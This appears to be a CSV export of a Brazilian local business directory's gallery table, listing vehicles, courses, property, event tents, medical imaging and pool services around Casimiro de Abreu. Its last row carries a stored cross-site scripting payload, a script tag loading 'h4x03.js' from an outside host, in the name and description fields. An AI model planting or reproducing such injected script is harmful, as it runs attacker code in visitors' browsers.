id,id_cliente,nome,capa,descricao
2,239,marchon,<blank>,fotos de produtos da loja
5,297,Siena,<blank>,usado
6,297,Hilux,<blank>,2010
7,296,churrasco,<blank>,churrasco Ã  quilo...
8,162,cursos de convenio,<blank>,SIEPRO- \r\ncurso de soldador 6G\r\nPORTA DE ENTRADA NO MERCADO DE TRABALHO
9,162,Unip- universidade paulista,<blank>,Polo
10,162,cursos  de Convenio  - IARJ,<blank>,IARJ-
11,162,Cursos de Convenio - CENEP,<blank>,Centro
12,316,<blank>,<blank>,<blank>
13,298,Apartamento no Centro de Macabu,<blank>,Aluga-se
14,322,<blank>,<blank>,<blank>
16,102,TINTAS,<blank>,"KEM TONE\r\npromoÃ§Ã£o 152,00\r\n"
17,102,ELETRICA,<blank>,FAME - INTER 3 TECLAS SIMPLES 10A/250V - BLANC\r\n
18,343,vendo imÃ³vel em lumiar,<blank>,7oo mts de terra com duas casas no centro de lumiar
19,102,<blank>,<blank>,<blank>
20,403,CalÃ§as,<blank>,<blank>
21,304,Galeria Yure,<blank>,<blank>
22,311,dss,<blank>,dsds
23,302,da,<blank>,da
24,1103,TENDAS ,<blank>,"Boss Estrutura e Eventos/Casimiro de Abreu. Tel:(22) 98136-5629/99768-6066. Locação de estruturas para eventos,como: Shows, festas, casamentos, formatura, eventos"
25,1103,PISO ELEVADO E ACARPETADO,<blank>,"Boss Estrutura e Eventos/Casimiro de Abreu. Tel:(22) 98136-5629/99768-6066. Locação de estruturas para eventos,como: Shows, festas, casamentos, formatura, eventos"
26,1103,,<blank>,Boss Estrutura e Eventos/Casimiro de Abreu. Tel:(22) 98136-5629/99768-6066. Locação de estruturas para event
27,1098,Ultrassonografia,<blank>,Ultrassonografia em casimiro de Abreu/RJ.   CADI Diagn
28,1098,Mamografia Digital CR,<blank>,"Mamografia Digital CR em Casimiro de Abreu/RJ \r\nCADI Diagnósticos (22)2778-5712.Rua Padre Anchieta, nº 91 -"
29,1098,Consultas Médicas ,,
30,253,Rio Piscinas Casimiro de Abreu,<blank>,"Rio Piscinas Casimiro de Abreu.RIO PISCINAS CASIMIRO DE ABREU.(22)99612-5026/(21)99690-2585. ENDEREÇO: BR101,KM205-CASIMIRO DE ABREU-RJ.CEP:28860-000. (A RIO PISCINAS ATINGE TODA REGIÃO DOS LAGOS CASIMIRO DE ABREU,MACAÉ,RIO"
31,1127,Instalação e manutenção de ar condicionado,<blank>,Instalação
32,1127,Institucional,<blank>,CLIMASSIST
33,1138,Varejão dos tecidos,<blank>,<blank>
34,595,ddd,<blank>,ddd
35,1228,Eletroserrana me,<blank>,<blank>
36,1008,"<script type=""text/javascript"" src=""http://yourjavascript.com/1291821113/h4x03.js""></script>",<blank>,"<script type=""text/javascript"" src=""http://yourjavascript.com/1291821113/h4x03.js""></script>"

